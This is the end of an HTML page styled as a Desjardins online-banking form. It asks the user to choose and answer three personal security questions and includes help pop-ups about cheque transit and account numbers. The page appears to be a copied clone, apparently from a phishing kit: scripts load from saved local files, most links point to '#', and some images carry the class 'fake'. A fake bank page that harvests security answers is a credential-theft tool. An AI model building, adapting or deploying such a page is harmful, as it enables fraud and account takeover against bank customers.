              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon père?">Quels sont le jour et le mois (jj-mm) de naissance de mon père?</option>
              <option value="Quel est le nom de famille de mon premier époux/ma première épouse?">Quel est le nom de famille de mon premier époux/ma première épouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l&#39;école où mon premier fils a commencé ses études primaires?">Quel est le nom de l'école où mon premier fils a commencé ses études primaires?</option>
              <option value="Quel métier exerçait mon grand-père maternel lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon grand-père maternel lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de la ville/municipalité du cégep/collège où j&#39;ai commencé mes études collégiales?">Quel est le nom de la ville/municipalité du cégep/collège où j'ai commencé mes études collégiales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon père?">Quelle est la couleur naturelle des cheveux de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 5 ans?">Quel est le nom de la ville/municipalité où j'habitais à 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mm) de naissance de ma mère?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma troisième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma troisième année du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalité où est né mon père?">Quel est le nom de la ville/municipalité où est né mon père?</option>
            </select>  <br><br><b>&nbsp;Réponse 2 :</b>
            <input id="a2" name="a2" type="text" required value="" autocomplete="off"></b> 
<br><br>
              
	<b> </b><div align="left"><b>Question 3 :
					<select name="q3" id="q3">
              <option value="">Selection</option>
              <option value="Quel métier exerçait ma mère lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait ma mère lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école secondaire?">Quel métier exerçait mon père lorsque j'allais à l'école secondaire?</option>
              <option value="En quelle année (aaaa) ai-je déménagé de chez mes parents pour m&#39;installer dans mon premier appartement?">En quelle année (aaaa) ai-je déménagé de chez mes parents pour m'installer dans mon premier appartement?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon père?">Quelle est l'année (aaaa) de naissance de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est la ville/municipalité de mon premier appartement/logement?">Quelle est la ville/municipalité de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxième enfant?">Quelle est la couleur naturelle des cheveux de mon deuxième enfant?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l&#39;acte de naissance de ma première fille?">Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l'acte de naissance de ma première fille?</option>
              <option value="Quelle est la ville où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quelle est la ville où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le prénom de ma grand-mère maternelle?">Quel est le prénom de ma grand-mère maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?">Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quel est le prénom de mon deuxième enfant?">Quel est le prénom de mon deuxième enfant?</option>
              <option value="Quel est le pays où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quel est le pays où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma première année du secondaire?">Quel est le nom de l'école que je fréquentais à ma première année du secondaire?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon père lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma mère?">Quel est le nom de jeune fille de ma mère?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 18 ans?">Quel est le numéro de la rue où j'habitais à 18 ans?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 30 ans?">Quel est le numéro de la rue où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalité où je suis né?">Quel est le nom de la ville/municipalité où je suis né?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon premier époux/ma première épouse?">Quelle est l'année (aaaa) de naissance de mon premier époux/ma première épouse?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?">Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?</option>
              <option value="Quelle est la ville/municipalité où est située la première maison dont j&#39;ai été propriétaire?">Quelle est la ville/municipalité où est située la première maison dont j'ai été propriétaire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de la ville/municipalité de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon baccalauréat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon baccalauréat?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 25 ans?">Quel est le numéro de la rue où j'habitais à 25 ans?</option>
              <option value="Quel est le nom de la rue de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de la rue de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;hôpital/de la maison de naissance où je suis né?">Quel est le nom de l'hôpital/de la maison de naissance où je suis né?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 30 ans?">Quel est le nom de la ville/municipalité où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-mère paternelle?">Quel est le nom de jeune fille de ma grand-mère paternelle?</option>
              <option value="Quel est le nom du premier employeur où j&#39;ai reçu mon premier salaire régulier?">Quel est le nom du premier employeur où j'ai reçu mon premier salaire régulier?</option>
              <option value="Quelle était la ville/municipalité où habitait mon premier amour sérieux?">Quelle était la ville/municipalité où habitait mon premier amour sérieux?</option>
              <option value="Au total, combien de frères et soeurs a/avait mon père?">Au total, combien de frères et soeurs a/avait mon père?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de ma mère?">Quelle est l'année (aaaa) de naissance de ma mère?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon père?">Quels sont le jour et le mois (jj-mm) de naissance de mon père?</option>
              <option value="Quel est le nom de famille de mon premier époux/ma première épouse?">Quel est le nom de famille de mon premier époux/ma première épouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l&#39;école où mon premier fils a commencé ses études primaires?">Quel est le nom de l'école où mon premier fils a commencé ses études primaires?</option>
              <option value="Quel métier exerçait mon grand-père maternel lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon grand-père maternel lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de la ville/municipalité du cégep/collège où j&#39;ai commencé mes études collégiales?">Quel est le nom de la ville/municipalité du cégep/collège où j'ai commencé mes études collégiales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon père?">Quelle est la couleur naturelle des cheveux de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 5 ans?">Quel est le nom de la ville/municipalité où j'habitais à 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mm) de naissance de ma mère?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma troisième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma troisième année du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalité où est né mon père?">Quel est le nom de la ville/municipalité où est né mon père?</option>
            </select>  <br><br><b>&nbsp;Réponse 3 :</b>
            <input id="a3" name="a3" type="text" required value="" autocomplete="off"></b> </div>
 </div>

                </div>

                <div class="row top20px">
                    <div class="col-xs-12 col-sm-9 col-md-9 text-right">
                        <button id="btnAnnuler" type="button" class="btn btn-default fullwidth" onclick="#">Annuler</button>
                    </div>
                    <div class="col-xs-12 col-sm-15 col-md-15">
                        <button id="btnSoumettre" type="submit" class="btn btn-primary fullwidth">Continuer</button> </div> </div> </div> </div> <div>
<input type="hidden" name="_tk" value="4093b8e4-7ce1-4e33-be24-01a717d729ef">
</div><input type="hidden" id="infoPosteClient" name="infoPosteClient"></form>

    <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
        <img alt="Sécurité garantie à 100 %" src="./index_files/g00-logo-securite-garantie-f.png">
    </div>

    
<div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="" src="./index_files/contenu-cheque-815-institut.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="./index_files/contenu-cheque-815-transit.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="./index_files/contenu-cheque-815-folio.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>

<script src="./index_files/modificationPhraseImageQuestions.min.js.download"></script>
<script src="./index_files/motPasseOublie.min.js.download"></script>
<script src="./index_files/info-poste-client.min.js.download"></script>




                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="./index_files/g00-logo-securite-garantie-f.png">
                                    <img class="fake" src="./index_files/logo-n1-desjardins-desktop(1).svg">
                                    
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        
                                            <img class="normal non-selectable" title="" src="./index_files/g00-logo-securite-garantie-f.png" alt="">
                                        
                                            <img class="normal non-selectable padding-left10px" title="Desjardins" src="./index_files/logo-n1-desjardins-desktop(1).svg" alt="Desjardins">
                                        
 </div> </div> <br> 

                            <br>
                        </div>
                    </div>

                </div>

            <br>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="#/particuliers/index.jsp">Services aux particuliers</a></li>
              <li><a href="#/entreprises/index.jsp">Services aux entreprises</a></li>
              <li><a href="#/coopmoi/index.jsp">Coopmoi</a></li>
              <li><a href="#/a-propos/index.jsp">À propos</a></li>
              <li><a href="#/mobile-gps-rss/index.jsp">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          




<ul>
  <li><a href="#">Sécurité</a></li>
  <li><a href="#/confidentialite/index.jsp">Confidentialité</a></li>
  <li><a href="#/conditions-utilisation-notes-legales/index.jsp">Conditions d'utilisation et notes légales</a></li>
  <li><a href="#/a-propos/responsabilite-sociale-cooperation/mouvement-cooperatif-solidaire/accessibilite/index.jsp">Accessibilité</a></li>
  <li><a href="#/plan-site/index.jsp">Plan du site</a></li>
</ul>



  
  






<p class="copyright">© 1996-2018, Mouvement des caisses Desjardins. Tous droits réservés.
</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup(&#39;#/securite/&#39;,&#39;Sécurité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Sécurité</a> | 
                            <a href="javascript:popup(&#39;http://www.desjardins.com/confidentialite/&#39;,&#39;Confidentialité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Confidentialité</a> | 
                            <a href="javascript:popup(&#39;http://www.desjardins.com/conditions-utilisation-notes-legales/&#39;,&#39;Conditions utilisation&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Conditions d'utilisation et notes légales</a> | 
                            <a href="javascript:popup(&#39;#/page-aide/index.jsp?docName=accessibilite&amp;domaine=ACCESD&#39;,&#39;Accessibilité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Accessibilité</a> 
 <br> 
 </span> <p>Copyright © 2018 Mouvement des caisses Desjardins. Tous droits réservés.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
        <!-- MONITEUR D'ACTIVITES -->
        
    
        <div tabindex="0" role="dialog" aria-haspopup="true" aria-live="assertive" aria-labelledby="enteteModale textTimeRemaining" class="modal fade" id="modalMoniteurActivites" aria-hidden="true" data-backdrop="static" data-keyboard="false">
            <div aria-live="assertive" class="modal-dialog modal-dialog-alert-info">
                <div class="modal-content">
                    <span class="sr-only">Boîte de dialogue</span>
                    <div id="expirationWarningTitle" class="modal-header">
                        <h2 id="enteteModale">Prolongation de session</h2>
                    </div>
                    <div class="alert alert-warning  modal-body-alert-info" id="expirationWarningBody">
                        <p tabindex="0" id="textTimeRemaining" class="margin0px">Le délai d’inactivité de votre session expirera dans <span id="sessionSecondsRemaining">??</span><span id="alert-info-min" class="hidden"> minute</span><span id="alert-info-sec" class="hidden"> seconde</span>. Les données entrées seront perdues.</p>
                        <p tabindex="0"><strong>Voulez-vous prolonger la session?</strong></p>
                    </div>
    
                    <div class="modal-footer">
                        <button id="logoutSession" type="button" class="btn btn-default" data-dismiss="modal">
                            Non
                        </button>
                        <button id="extendSession" type="button" class="btn btn-primary btn-success" data-dismiss="modal">
                            Oui
                        </button>
                    </div>
                </div>
            </div>
        </div>

     
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="./index_files/bootstrap.min.js.download" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="#/static-accesweb/201808090322/lib/externe/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->


<script src="./index_files/fwd-bootstrap.min.js.download" type="text/javascript"></script>
<!--[if IE]>
    <script src="#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="#/static-accesweb/201808090322/lib/externe/html5shiv/3.7.0/html5shiv.js" type="text/javascript"></script>
    
    <script src="#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->




<!-- ni : accesweb01_berlin7_rel05  -->
<!-- pv :  -->

</fwd_placeholder__contenu_head_fragment_principal></body></html>